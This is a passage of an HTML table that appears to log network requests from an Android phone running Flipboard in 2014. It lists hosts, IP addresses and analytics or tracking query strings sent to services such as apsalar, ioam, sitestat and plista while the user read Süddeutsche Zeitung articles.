      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>25 </th>
      <td>  16038</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /tx.io?st=mobsued&amp;cp=spracheDE%2FformatTXT%2FerzeugerRED%2FhomepageNO%2FauslieferungMOB%2FappNO%2FpaidNO%2FinhaltDIGITAL&amp;pt=CP&amp;rf=flipboard.com&amp;r2=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;ur=www.sueddeutsche.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0004&amp;vr=303&amp;id=vngwhf&amp;lt=1390051326056&amp;ev=&amp;cs=cn5je0&amp;mo=0</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>26 </th>
      <td> 132412</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /tx.io?st=mobsued&amp;cp=spracheDE%2FformatTXT%2FerzeugerRED%2FhomepageNO%2FauslieferungMOB%2FappNO%2FpaidNO%2FinhaltKARRIERE&amp;pt=CP&amp;rf=flipboard.com&amp;r2=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;ur=www.sueddeutsche.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0001&amp;vr=303&amp;id=y6dim4&amp;lt=1390147627064&amp;ev=&amp;cs=nkfe26&amp;mo=0</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>27 </th>
      <td>   3835</td>
      <td>   91.215.103.65</td>
      <td>                            de.ioam.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     /tx.io?st=mobsued&amp;cp=spracheDE%2FformatTXT%2FerzeugerRED%2FhomepageNO%2FauslieferungMOB%2FappNO%2FpaidNO%2FinhaltMUENCHEN&amp;pt=CP&amp;rf=flipboard.com&amp;r2=http%3A%2F%2Fflipboard.com%2Fredirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;ur=www.sueddeutsche.de&amp;xy=800x1280x32&amp;lo=DE%2Fn.a.&amp;cb=0004&amp;vr=303&amp;id=vngwhf&amp;lt=1390050885098&amp;ev=&amp;cs=oshi9b&amp;mo=0</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>28 </th>
      <td>  16134</td>
      <td>   77.72.116.154</td>
      <td>                       de.sitestat.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /sueddeutsche/sueddeutsche/s?mobile.digital.thema.streaming.artikel.streamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis&amp;ns__t=1390051326068&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>29 </th>
      <td> 132425</td>
      <td>   77.72.118.154</td>
      <td>                       de.sitestat.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /sueddeutsche/sueddeutsche/s?mobile.karriere.thema.hochschulen.artikel.studie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne&amp;ns__t=1390147627074&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212</td>
      <td>                        Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100, de</td>
    </tr>
    <tr>
      <th>30 </th>
      <td>   4128</td>
      <td>   77.72.112.154</td>
      <td>                       de.sitestat.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /sueddeutsche/sueddeutsche/s?mobile.muenchen.thema.unfall.artikel.muenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg&amp;ns__t=1390050885114&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>31 </th>
      <td>   4555</td>
      <td>   77.72.112.154</td>
      <td>                       de.sitestat.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /sueddeutsche/sueddeutsche/s?mobile.muenchen.thema.unfall.artikel.muenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg&amp;ns_m2=yes&amp;ns_setsiteck=52DA7E4843FD03B2&amp;ns__t=1390050885114&amp;ads=y&amp;ns_referrer=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>32 </th>
      <td>  73954</td>
      <td>  173.194.112.46</td>
      <td>                         dl.google.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           /dl/android/tts/patts/patts_metadata_19.proto</td>
      <td>                                                                                                                                                                  Dalvik/1.6.0 (Linux; U; Android 4.3.1; GT-N7000 Build/JLS36I)</td>
    </tr>
    <tr>
      <th>33 </th>
      <td>  18084</td>
      <td>   209.49.108.71</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=12c8430f-d6e8-4b8b-a81b-37d42dc6bf6f&amp;sdk=4.0.2&amp;t=781.191&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=3eb6859c2b7b4872d0903a5bd5b73e46d79997aa</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>34 </th>
      <td>  46752</td>
      <td>  205.158.23.232</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=4ed8a8b6-82c0-4232-a5ce-0ff0acf87c0b&amp;sdk=4.0.2&amp;t=80.056&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=e8da70f8d71b5ac6e44efe3651611d6ee9284ad5</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>35 </th>
      <td>  22734</td>
      <td>   209.49.108.66</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=5ad3eb54-8955-40e7-8108-c558e6adc919&amp;sdk=4.0.2&amp;t=194.835&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=705f56c0c458b75d9907a3d50af5a2ad0c01e307</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>36 </th>
      <td>  87872</td>
      <td>  205.158.23.245</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=7cd33003-f7df-4eeb-b1c5-572fb46798f1&amp;sdk=4.0.2&amp;t=140.42000000000002&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=409ba731c26ccb1509051b0b00a8fe83cb893026</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>37 </th>
      <td>  34245</td>
      <td>  205.158.23.246</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;t=1.390057933191E9&amp;u=19ba7bd21bb3cfa3&amp;lag=83.558&amp;h=250884806d5e537fcebc7f11f751441409667f4c</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>38 </th>
      <td>  32709</td>
      <td>  205.158.23.239</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;t=246.213&amp;u=19ba7bd21bb3cfa3&amp;lag=0.002&amp;h=ba36888f3bdbc623ae733fe6ddb4a7e9d3970329</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>39 </th>
      <td>  32913</td>
      <td>  205.158.23.230</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;t=246.213&amp;u=19ba7bd21bb3cfa3&amp;lag=17.977&amp;h=f656c2496cc7e5754b5a481eaa5e1301149f00a7</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>40 </th>
      <td>  91401</td>
      <td>  205.158.23.245</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=96e5aa98-f272-4435-be3f-06d014cd8a7b&amp;sdk=4.0.2&amp;t=100.32600000000001&amp;u=19ba7bd21bb3cfa3&amp;lag=0.002&amp;h=23a34f980019b660ae6d68cea5d60d495d3b513c</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>41 </th>
      <td> 116489</td>
      <td>  205.158.23.232</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=%7B%7D&amp;i=flipboard.app&amp;n=end_session&amp;p=Android&amp;rt=json&amp;s=e9ae671b-3968-48bd-bbf6-87c60f5c0e40&amp;sdk=4.0.2&amp;t=86.96000000000001&amp;u=19ba7bd21bb3cfa3&amp;lag=0.0&amp;h=a662c61a8e06173f3bbb43d2dd03509ca773877c</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>42 </th>
      <td>  12218</td>
      <td>  205.158.23.239</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=&amp;i=flipboard.app&amp;n=heartbeat&amp;p=Android&amp;rt=json&amp;s=12c8430f-d6e8-4b8b-a81b-37d42dc6bf6f&amp;sdk=4.0.2&amp;t=301.022&amp;u=19ba7bd21bb3cfa3&amp;lag=0.029&amp;h=29e3483b07cf05a365a247e4820f61a1b75159c7</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>43 </th>
      <td> 137318</td>
      <td>  205.158.23.230</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  /api/v1/event?a=Flipboard&amp;av=2.2.2&amp;e=&amp;i=flipboard.app&amp;n=heartbeat&amp;p=Android&amp;rt=json&amp;s=4f544310-2c2f-4dcf-9bef-762535fcb4c1&amp;sdk=4.0.2&amp;t=301.277&amp;u=19ba7bd21bb3cfa3&amp;lag=0.001&amp;h=4c805327cfb1d98f8dcba5ea9b4a09aba7be887b</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>44 </th>
      <td>  34520</td>
      <td>  205.158.23.246</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      /api/v1/event?u=-1</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>45 </th>
      <td>   1334</td>
      <td>  205.158.23.239</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=12c8430f-d6e8-4b8b-a81b-37d42dc6bf6f&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=0.976&amp;h=13e2981c856f8d5b03df533875ab0e7051b16ad4</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>46 </th>
      <td> 121056</td>
      <td>   209.49.108.65</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=4c161362-9275-473d-9068-14098d15ef54&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.732&amp;h=d285ad812ebea1d8d0a0682f54d618c3bf6900b9</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>47 </th>
      <td>  45215</td>
      <td>  205.158.23.232</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=4ed8a8b6-82c0-4232-a5ce-0ff0acf87c0b&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.494&amp;h=a56e9b60daae1674ec4c759d4601521221e2f58a</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>48 </th>
      <td> 126436</td>
      <td>  205.158.23.230</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=4f544310-2c2f-4dcf-9bef-762535fcb4c1&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.244&amp;h=5603e16f6b981f61f47be74396dc7879580d401a</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>49 </th>
      <td>  18474</td>
      <td>   209.49.108.71</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=5ad3eb54-8955-40e7-8108-c558e6adc919&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.178&amp;h=7e5b2e6faf5f4e13e071e19f7b18a2036e4f8c99</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>50 </th>
      <td>  99004</td>
      <td>   209.49.108.66</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=6760c71d-2ef1-4482-b465-f07bb91abe81&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=0.165&amp;h=1ab03e483d1330b35abba17936a9f516f4455f37</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>51 </th>
      <td>  83526</td>
      <td>  205.158.23.245</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=7cd33003-f7df-4eeb-b1c5-572fb46798f1&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.351&amp;h=f520aae0f0556292cbb16e64e13a1945509fd257</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>52 </th>
      <td>  27685</td>
      <td>  205.158.23.231</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=8e65194d-96a8-407c-9df6-893a56160c2a&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.564&amp;h=9e389c83ed0ad2fc6cfb55483654aed3857f5603</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>53 </th>
      <td>  89800</td>
      <td>  205.158.23.245</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=96e5aa98-f272-4435-be3f-06d014cd8a7b&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=0.232&amp;h=8bc0f1a369ef2190d4be0d19776c98e81b4c2e1f</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>54 </th>
      <td> 112905</td>
      <td>  205.158.23.232</td>
      <td>                         e.apsalar.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          /api/v1/start?a=Flipboard&amp;ab=armeabi-v7a&amp;av=2.2.2&amp;br=Samsung&amp;c=wwan&amp;de=GT-N7000&amp;i=flipboard.app&amp;ma=samsung&amp;mo=GT-N7000&amp;n=Flipboard&amp;p=Android&amp;pr=GT-N7000&amp;rt=json&amp;s=e9ae671b-3968-48bd-bbf6-87c60f5c0e40&amp;sdk=4.0.2&amp;u=19ba7bd21bb3cfa3&amp;v=4.3.1&amp;lag=1.2610000000000001&amp;h=9e3ccea7d91a68c3817076e79398c8575f547e07</td>
      <td>                                                                                                                                                                                                                      SDK/4.0.2</td>
    </tr>
    <tr>
      <th>55 </th>
      <td>   4119</td>
      <td>    176.9.103.51</td>
      <td>                       farm.plista.com</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            /getuid?origin=http%3A%2F%2Fwww.sueddeutsche.de&amp;publickey=a279c87dd4de76f6f1bf200a&amp;mode=test</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>56 </th>
      <td>  16440</td>
      <td>    176.9.103.51</td>
      <td>                       farm.plista.com</td>
      <td> GET</td>
      <td>         /tinyPlistaGetRendered.php?publickey=a279c87dd4de76f6f1bf200a&amp;widgetname=mobile&amp;c=digital&amp;pxr=1.6699999570846558&amp;isid=%20undefined&amp;item%5Bobjectid%5D=m1866025&amp;item%5Bcreated_at%5D=1390035621&amp;item%5Burl%5D=http%3A%2F%2Fwww.sueddeutsche.de%2Fdigital%2Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;item%5Bkicker%5D=Streamseite%20Redtube&amp;item%5Btitle%5D=L%C3%B6chriges%20Gutachten%20bringt%20Porno-Abmahner%20in%20Bedr%C3%A4ngnis&amp;item%5Btext%5D=Wie%20kamen%20sie%20an%20die%20IP-Adressen%20der%20Redtube-Nutzer%3F%20Ein%20jetzt%20aufgetauchtes%2C%20fragw%C3%BCrdiges%20Gutachten%20birgt%20neuen%20%C3%84rger%20f%C3%BCr%20die%20Hinterm%C3%A4nner%20der%20Abmahnwelle.%20Doch%20auch%20f%C3%BCr%20einige%20K%C3%B6lner%20Richter%20ist%20das%20Papier%20eine%20Blamage.&amp;item%5Bimg%5D=http%3A%2F%2Fpolpix.sueddeutsche.com%2Fbild%2F1.1839719.1389206254%2F560x315%2Fredtube-abmahnung.jpg&amp;item%5Bcategory%5D=digital&amp;instanceID=&amp;Pookie=Q2C1zHwmoPb4ncSlaUvJGQ%3D%3D</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>57 </th>
      <td>   4136</td>
      <td>    176.9.103.51</td>
      <td>                       farm.plista.com</td>
      <td> GET</td>
      <td>                                                              /tinyPlistaGetRendered.php?publickey=a279c87dd4de76f6f1bf200a&amp;widgetname=mobile&amp;c=muenchen&amp;pxr=1.6699999570846558&amp;isid=%20undefined&amp;item%5Bobjectid%5D=m1866074&amp;item%5Bcreated_at%5D=1390047141&amp;item%5Burl%5D=http%3A%2F%2Fwww.sueddeutsche.de%2Fmuenchen%2Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;item%5Bkicker%5D=M%C3%BCnchen-Haidhausen&amp;item%5Btitle%5D=Pl%C3%B6tzlich%20zehn%20Meter%20tiefes%20Loch%20im%20Gehweg&amp;item%5Btext%5D=T%C3%BCckische%20Falle%20in%20Haidhausen%3A%20Auf%20einem%20Gehsteig%20in%20M%C3%BCnchen%20ist%20ein%20Mann%20fast%20in%20ein%20zehn%20Meter%20tiefes%20Loch%20eingebrochen.%20Jetzt%20r%C3%A4tseln%20die%20Beh%C3%B6rden%2C%20wozu%20der%20gemauerte%20Schacht%20dienen%20k%C3%B6nnte.&amp;item%5Bimg%5D=http%3A%2F%2Fpolpix.sueddeutsche.com%2Fpolopoly_fs%2F1.1866075.1390044549!%2FhttpImage%2Fimage.jpg_gen%2Fderivatives%2F560x315%2Fimage.jpg&amp;item%5Bcategory%5D=muenchen&amp;instanceID=&amp;Pookie=</td>
      <td>                            Mozilla/5.0 (Linux; U; Android 4.3.1; de-de; GT-N7000 Build/JLS36I) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30 Flipboard/2.2.2/2070,2.2.2.2070,2014-01-16 17:55, +0100</td>
    </tr>
    <tr>
      <th>58 </th>
      <td> 136960</td>
      <td>   193.46.63.233</td>
      <td>                         faz.ivwbox.de</td>
      <td> GET</td>
      <td>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       /cgi-bin/ivw/CP/szmmobil_222F000006E6;faz.net/aktuell/mobil/ressorts/gesellschaft?n=&amp;d=1390147719</td>
